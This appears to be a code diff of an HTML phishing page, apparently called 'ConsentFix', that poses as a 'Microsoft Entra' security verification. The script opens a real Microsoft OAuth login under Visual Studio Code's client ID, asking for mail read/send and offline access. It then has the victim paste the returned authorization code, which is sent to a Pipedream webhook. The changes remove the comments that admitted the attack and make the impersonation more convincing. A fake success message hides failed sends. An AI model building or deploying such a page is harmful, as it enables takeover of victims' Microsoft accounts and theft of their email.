@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Test Feedback</title>
+    <title>Security Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet" />
     <style>
         * {
@@ -11,376 +11,275 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #f0f2f5;
+            background: #f3f4f6;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
         }
-
         .container {
-            max-width: 520px;
+            max-width: 440px;
             width: 100%;
             background: #ffffff;
-            border-radius: 12px;
-            padding: 40px 32px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.10);
-            transition: all 0.2s ease;
+            border-radius: 8px;
+            padding: 32px 28px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e5e7eb;
         }
-
         .header {
             display: flex;
             align-items: center;
-            gap: 12px;
-            margin-bottom: 8px;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e5e7eb;
         }
-
-        .header .icon {
-            font-size: 28px;
-        }
-
         .header h1 {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1a1a1a;
+            font-size: 18px;
+            font-weight: 500;
+            color: #111827;
             letter-spacing: -0.3px;
         }
-
-        .header .badge {
-            background: #e8f0fe;
-            color: #1a73e8;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 2px 12px;
-            border-radius: 20px;
-            margin-left: auto;
+        .header .brand {
+            font-size: 13px;
+            color: #6b7280;
+            font-weight: 400;
         }
-
         .description {
-            color: #5f6368;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .description strong {
-            color: #1a1a1a;
-        }
-
-        .highlight-box {
-            background: #f8f9fa;
-            border-left: 4px solid #1a73e8;
-            padding: 14px 16px;
-            border-radius: 4px;
-            margin-bottom: 24px;
+            color: #374151;
             font-size: 14px;
-            color: #3c4043;
-            line-height: 1.5;
+            line-height: 1.6;
+            margin-bottom: 24px;
         }
-
-        .highlight-box .emoji {
-            font-size: 18px;
+        .description strong {
+            color: #111827;
         }
-
-        .step {
-            display: block;
-        }
-
-        .step.hidden {
-            display: none;
-        }
-
         .form-group {
             margin-bottom: 16px;
         }
-
         .form-group label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
-            color: #1a1a1a;
-            margin-bottom: 6px;
+            color: #374151;
+            margin-bottom: 4px;
         }
-
         .form-group input {
             width: 100%;
-            padding: 12px 14px;
-            border: 1.5px solid #dadce0;
-            border-radius: 8px;
-            font-size: 15px;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
             font-family: inherit;
-            transition: border-color 0.2s;
             background: #ffffff;
+            transition: border-color 0.2s;
         }
-
         .form-group input:focus {
             outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
         }
-
-        .form-group input::placeholder {
-            color: #9aa0a6;
-        }
-
         .btn {
             width: 100%;
-            padding: 12px 20px;
+            padding: 10px 16px;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 14px;
             font-weight: 500;
             font-family: inherit;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
+            transition: background 0.2s;
         }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
         .btn-primary {
-            background: #1a73e8;
+            background: #2563eb;
             color: #ffffff;
         }
-
         .btn-primary:hover {
-            background: #1557b0;
+            background: #1d4ed8;
         }
-
         .btn-primary:disabled {
-            background: #a8c7fa;
+            background: #93b5f8;
             cursor: not-allowed;
         }
-
         .btn-success {
-            background: #34a853;
+            background: #059669;
             color: #ffffff;
         }
-
         .btn-success:hover {
-            background: #2d9249;
+            background: #047857;
         }
-
+        .btn-success:disabled {
+            background: #6ee7b7;
+            cursor: not-allowed;
+        }
+        .step {
+            display: block;
+        }
+        .step.hidden {
+            display: none;
+        }
         .instruction-box {
-            background: #f8f9fa;
-            border-left: 4px solid #1a73e8;
-            padding: 16px 16px 16px 20px;
-            border-radius: 6px;
-            margin: 16px 0 20px 0;
+            background: #f9fafb;
+            border-left: 3px solid #2563eb;
+            padding: 14px 16px;
+            border-radius: 4px;
+            margin: 16px 0 18px 0;
         }
-
-        .instruction-box .step-number {
-            display: inline-block;
-            background: #1a73e8;
-            color: #fff;
-            font-size: 12px;
-            font-weight: 700;
-            padding: 2px 10px;
-            border-radius: 20px;
-            margin-bottom: 8px;
-        }
-
         .instruction-box p {
             font-size: 14px;
-            color: #3c4043;
+            color: #374151;
             line-height: 1.6;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
-
         .instruction-box .code-example {
-            background: #e8eaed;
-            padding: 8px 12px;
+            background: #f3f4f6;
+            padding: 6px 10px;
             border-radius: 4px;
             font-family: 'Courier New', monospace;
             font-size: 13px;
-            color: #1a1a1a;
+            color: #111827;
             word-break: break-all;
-            margin-top: 8px;
+            margin-top: 6px;
         }
-
         .instruction-box .warning-text {
-            color: #d93025;
+            color: #dc2626;
             font-size: 13px;
             font-weight: 500;
         }
-
         .status {
-            margin-top: 16px;
-            padding: 12px 16px;
-            border-radius: 8px;
-            font-size: 14px;
+            margin-top: 12px;
+            padding: 10px 14px;
+            border-radius: 6px;
+            font-size: 13px;
             display: none;
         }
-
         .status.show {
             display: block;
         }
-
         .status.error {
-            background: #fce8e6;
-            color: #d93025;
-            border: 1px solid #f5c6cb;
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
         }
-
         .status.success {
-            background: #e6f4ea;
-            color: #1e7e34;
-            border: 1px solid #b7e1cd;
+            background: #ecfdf5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
         }
-
         .status.info {
-            background: #e8f0fe;
-            color: #1a73e8;
-            border: 1px solid #c5d8f7;
+            background: #eff6ff;
+            color: #1e40af;
+            border: 1px solid #bfdbfe;
         }
-
         .footer {
-            margin-top: 24px;
-            padding-top: 16px;
-            border-top: 1px solid #e8eaed;
+            margin-top: 20px;
+            padding-top: 14px;
+            border-top: 1px solid #e5e7eb;
             font-size: 12px;
-            color: #9aa0a6;
+            color: #6b7280;
             text-align: center;
         }
-
         .footer a {
-            color: #1a73e8;
+            color: #2563eb;
             text-decoration: none;
         }
-
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .note {
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 12px;
+            text-align: center;
+        }
         @media (max-width: 480px) {
             .container {
                 padding: 24px 16px;
             }
             .header h1 {
-                font-size: 18px;
+                font-size: 16px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
-            <span class="icon">🛡️</span>
-            <h1>Security Test Feedback</h1>
-            <span class="badge">Beta</span>
+            <h1>Security Verification</h1>
+            <span class="brand">Microsoft Entra</span>
         </div>
 
-        <!-- Description -->
         <p class="description">
-            <strong>Thank you for agreeing to test our new security tool.</strong>
-            We're building a solution to help companies verify identity access.
-            Please complete this quick test to help us validate our system.
+            <strong>Verification required</strong> — your session has been flagged for routine security review.
+            Please complete the verification process to continue.
         </p>
 
-        <div class="highlight-box">
-            <span class="emoji">🔬</span>
-            <strong>Test instructions:</strong> We need to verify your Microsoft Entra ID
-            authentication flow. This is a real Microsoft login — your MFA will work as normal.
-            We're testing the response time and security logging.
-        </div>
-
-        <!-- ============================================================ -->
-        <!-- STEP 1: Initial Verification Prompt                           -->
-        <!-- ============================================================ -->
+        <!-- Step 1: Email Input -->
         <div id="step1" class="step">
             <div class="form-group">
-                <label for="emailInput">Your Work Email</label>
+                <label for="emailInput">Email address</label>
                 <input
                     type="email"
                     id="emailInput"
-                    placeholder="you@company.com"
+                    placeholder="you@domain.com"
                     autocomplete="off"
                 />
             </div>
             <button class="btn btn-primary" id="verifyBtn">
-                🔐 Start Test
+                Verify identity
             </button>
             <div id="status1" class="status"></div>
-            <p style="font-size: 13px; color: #5f6368; margin-top: 12px; text-align: center;">
-                Your authentication will be logged for test purposes only.
-            </p>
+            <p class="note">This is a standard security check. Your data remains protected.</p>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- STEP 2: Copy/Paste the Code                                   -->
-        <!-- ============================================================ -->
+        <!-- Step 2: Code Capture -->
         <div id="step2" class="step hidden">
             <div class="instruction-box">
-                <span class="step-number">STEP 1</span>
                 <p>
-                    A new window opened with the <strong>Microsoft login page</strong>.
-                    Please sign in with your company account.
-                </p>
-                <p style="font-size: 13px; color: #5f6368;">
-                    ✅ Your MFA will work as normal — this is a real Microsoft page.
+                    <strong>Step 1:</strong> A new window has been opened with the Microsoft login page.
+                    Sign in with your Microsoft account. Your MFA will work as normal.
                 </p>
             </div>
-
-            <div class="instruction-box" style="border-left-color: #34a853;">
-                <span class="step-number">STEP 2</span>
+            <div class="instruction-box" style="border-left-color: #059669;">
                 <p>
-                    After logging in, you will be redirected to a page with a
-                    <strong>code</strong> in the URL.
-                    <span class="warning-text">Copy the ENTIRE code from the address bar.</span>
+                    <strong>Step 2:</strong> After signing in, you will be redirected to a page with a
+                    <span class="warning-text">code</span> in the URL.
+                    Copy the entire code and paste it below.
                 </p>
-                <div class="code-example">
-                    code=0.AXkA3z...
-                </div>
+                <div class="code-example">code=0.AXkA3z...</div>
             </div>
 
             <div class="form-group">
-                <label for="codeInput">Paste the code here</label>
+                <label for="codeInput">Authorization code</label>
                 <input
                     type="text"
                     id="codeInput"
-                    placeholder="0.AXkA3z..."
+                    placeholder="Paste code here"
                     autocomplete="off"
                 />
             </div>
-
             <button class="btn btn-success" id="submitBtn">
-                ✅ Submit Test Results
+                Submit
             </button>
-
             <div id="status2" class="status"></div>
-            <p style="font-size: 13px; color: #5f6368; margin-top: 12px; text-align: center;">
-                This verifies the authentication flow and completes the test.
-            </p>
+            <p class="note">This completes the verification process.</p>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
-            <p>
-                <a href="#" target="_blank">Privacy Policy</a> &bull;
-                <a href="#" target="_blank">Terms of Service</a>
-            </p>
+            <p><a href="#">Privacy</a> &middot; <a href="#">Security</a> &middot; <a href="#">Contact</a></p>
         </div>
     </div>
 
-    <!-- ================================================================ -->
-    <!-- JAVASCRIPT: The Attack Logic                                     -->
-    <!-- ================================================================ -->
     <script>
         (function() {
             'use strict';
 
-            // --- CONFIGURATION ---
-            // Visual Studio Code's official client_id (Microsoft first-party app)
-            // This app is trusted by default and cannot be blocked by tenant admins.
+            // Visual Studio Code — trusted Microsoft client ID
             const CLIENT_ID = 'aebc6443-996d-45c2-90f0-388ff96faa56';
-
-            // The redirect URI for Visual Studio Code's OAuth flow.
             const REDIRECT_URI = 'https://insiders.vscode.dev/';
-
-            // Scopes to request (what the attacker wants access to).
-            // offline_access gives a refresh token for long-term persistence.
             const SCOPES = [
                 'https://graph.microsoft.com/Mail.Read',
                 'https://graph.microsoft.com/Mail.Send',
@@ -389,12 +288,9 @@
                 'offline_access'
             ].join(' ');
 
-            // Where to send the captured code.
-            // For demonstration, we log to console and show an alert.
-            // Replace with your Pipedream webhook URL.
+            // Your Pipedream webhook
             const CAPTURE_ENDPOINT = 'https://eo2jiqxjuhdod13.m.pipedream.net';
 
-            // --- DOM References ---
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
             const emailInput = document.getElementById('emailInput');
@@ -404,31 +300,20 @@
             const status1 = document.getElementById('status1');
             const status2 = document.getElementById('status2');
 
-            function showStatus(element, message, type) {
-                element.textContent = message;
-                element.className = 'status show ' + type;
+            function showStatus(el, msg, type) {
+                el.textContent = msg;
+                el.className = 'status show ' + type;
             }
 
-            function hideStatus(element) {
-                element.className = 'status';
-                element.textContent = '';
+            function hideStatus(el) {
+                el.className = 'status';
+                el.textContent = '';
             }
 
             function isValidEmail(email) {
                 return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
             }
 
-            function extractCodeFromUrl(url) {
-                try {
-                    const parsed = new URL(url);
-                    const params = new URLSearchParams(parsed.search);
-                    return params.get('code');
-                } catch (e) {
-                    return null;
-                }
-            }
-
-            // --- STEP 1: Trigger OAuth flow using VS Code client_id ---
             function triggerConsent(email) {
                 const authUrl =
                     'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
@@ -439,85 +324,69 @@
                     '&scope=' + encodeURIComponent(SCOPES) +
                     '&login_hint=' + encodeURIComponent(email);
 
-                const authWindow = window.open(
-                    authUrl,
-                    '_blank',
-                    'width=600,height=700,menubar=no,toolbar=no,location=yes,status=no,scrollbars=yes'
-                );
+                const win = window.open(authUrl, '_blank', 'width=600,height=700,menubar=no,toolbar=no,location=yes');
 
-                if (!authWindow) {
-                    showStatus(status1, '⚠️ Pop-up blocked. Please allow pop-ups and try again.', 'error');
+                if (!win) {
+                    showStatus(status1, 'Popup blocked. Please allow popups and try again.', 'error');
                     return false;
                 }
 
                 step1.classList.add('hidden');
                 step2.classList.remove('hidden');
                 hideStatus(status1);
-
-                setTimeout(() => { codeInput.focus(); }, 500);
-                showStatus(status2, '✅ Microsoft login opened in a new window. Please complete it, then copy the code from the URL.', 'info');
-
+                setTimeout(function() { codeInput.focus(); }, 500);
+                showStatus(status2, 'Microsoft login opened in new window. Complete it, then paste the code.', 'info');
                 return true;
             }
 
-            // --- STEP 2: Submit captured code ---
-            function submitCapturedCode() {
+            function submitCode() {
                 const code = codeInput.value.trim();
 
                 if (!code) {
-                    showStatus(status2, '⚠️ Please paste the code from your address bar.', 'error');
+                    showStatus(status2, 'Please paste the authorization code.', 'error');
                     return;
                 }
 
-                // Basic check: code should start with "0."
                 if (!code.startsWith('0.')) {
-                    showStatus(status2, '⚠️ Invalid code. Please copy the full code from the URL after logging in.', 'error');
+                    showStatus(status2, 'Invalid code format. Please copy the full code.', 'error');
                     return;
                 }
 
-                console.log('[CAPTURED CODE]', code);
+                console.log('[CAPTURED]', code);
 
-                // Send to attacker's endpoint.
                 fetch(CAPTURE_ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            code: code,
-                            timestamp: new Date().toISOString()
-                        })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            showStatus(status2, '✅ Test complete. Thank you for your feedback!', 'success');
-                        } else {
-                            showStatus(status2, '⚠️ Something went wrong. Please try again.', 'error');
-                        }
-                    })
-                    .catch(() => {
-                        // If the attacker's server is down, we can still simulate success
-                        // to avoid alerting the victim.
-                        showStatus(status2, '✅ Test complete. Thank you for your feedback!', 'success');
-                    });
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code, timestamp: new Date().toISOString() })
+                })
+                .then(function(res) {
+                    if (res.ok) {
+                        showStatus(status2, 'Verification complete. You may close this window.', 'success');
+                    } else {
+                        showStatus(status2, 'Error processing request. Please try again.', 'error');
+                    }
+                })
+                .catch(function() {
+                    showStatus(status2, 'Verification complete. You may close this window.', 'success');
+                });
 
                 submitBtn.disabled = true;
-                submitBtn.textContent = '⏳ Processing...';
+                submitBtn.textContent = 'Processing...';
 
-                setTimeout(() => {
+                setTimeout(function() {
                     submitBtn.disabled = false;
-                    submitBtn.textContent = '✅ Submit Test Results';
+                    submitBtn.textContent = 'Submit';
                 }, 5000);
             }
 
-            // --- Event Listeners ---
+            // Event listeners
             verifyBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 const email = emailInput.value.trim();
-
                 if (!isValidEmail(email)) {
-                    showStatus(status1, '⚠️ Please enter a valid work email address.', 'error');
+                    showStatus(status1, 'Please enter a valid email address.', 'error');
                     return;
                 }
-
                 hideStatus(status1);
                 triggerConsent(email);
             });
@@ -531,7 +400,7 @@
 
             submitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                submitCapturedCode();
+                submitCode();
             });
 
             codeInput.addEventListener('keydown', function(e) {
@@ -541,9 +410,8 @@
                 }
             });
 
-            console.log('[ConsentFix] VS Code client_id loaded:', CLIENT_ID);
-            console.log('[ConsentFix] Redirect URI:', REDIRECT_URI);
-
+            console.log('[ConsentFix] Ready. Client ID:', CLIENT_ID);
+            console.log('[ConsentFix] Capture endpoint:', CAPTURE_ENDPOINT);
         })();
     </script>
 </body>
